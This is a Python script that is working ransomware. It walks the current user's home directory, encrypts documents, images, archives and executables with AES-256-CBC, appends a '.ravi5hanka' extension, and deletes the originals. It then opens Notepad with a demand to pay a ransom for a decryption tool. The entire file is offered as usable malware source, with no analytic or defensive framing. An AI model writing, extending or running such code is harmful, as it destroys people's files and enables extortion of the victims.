import os
import tempfile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import subprocess

# Define common file extensions to encrypt. Change as needed.
COMMON_EXTENSIONS = ['.txt', '.docx', '.jpg', '.png', '.pdf', '.xlsx', '.zip', 'exe']

def generate_key_iv():
    """Generates a random encryption key and IV."""
    key = os.urandom(32)  # 32 bytes for AES-256
    iv = os.urandom(16)   # 16 bytes for AES
    return key, iv

def save_key_iv(key, iv):
    """Saves the encryption key and IV to a file in the temp directory."""
    temp_dir = tempfile.gettempdir()  # Get the system's temp directory
    key_file_path = os.path.join(temp_dir, "keyfile.bin")
    with open(key_file_path, "wb") as key_file:
        key_file.write(key + iv)
    print(f"Key and IV saved to: {key_file_path}")

def encrypt_file(file_path, key, iv):
    """Encrypts a file using AES-256-CBC."""
    try:
        # Read the file content
        with open(file_path, 'rb') as file:
            plaintext = file.read()

        # Pad the plaintext to be a multiple of 16 bytes (AES block size)
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(plaintext) + padder.finalize()

        # Encrypt the data
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()

        # Write the encrypted data to a new file
        encrypted_file_path = file_path + '.ravi5hanka'
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(iv + ciphertext)  # Store IV with the ciphertext

        # Remove the original file
        os.remove(file_path)

        print(f"Encrypted: {file_path} -> {encrypted_file_path}")
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

def encrypt_files_in_directory(directory, key, iv):
    """Encrypts all files with common extensions in the specified directory."""
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in COMMON_EXTENSIONS):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key, iv)

def show_notepad_message(message):
    """Displays a Notepad window with the specified message."""
    try:
        with open("message.txt", "w") as f:
            f.write(message)
        subprocess.Popen(["notepad.exe", "message.txt"])
    except Exception as e:
        print(f"Error displaying Notepad message: {e}")

if __name__ == "__main__":
    # Get the current user's home directory (e.g., C:\Users\<Username>)
    user_home_directory = os.path.expanduser("~")

    # Generate and save the encryption key and IV
    key, iv = generate_key_iv()
    save_key_iv(key, iv)

    # Encrypt files in the user's home directory
    print(f"Encrypting files in: {user_home_directory}")
    encrypt_files_in_directory(user_home_directory, key, iv)

    # Show the Notepad message after encryption
    show_notepad_message("Your Files have been Encrypted!!! Pay the Ransom to get the Decryption Tool.")
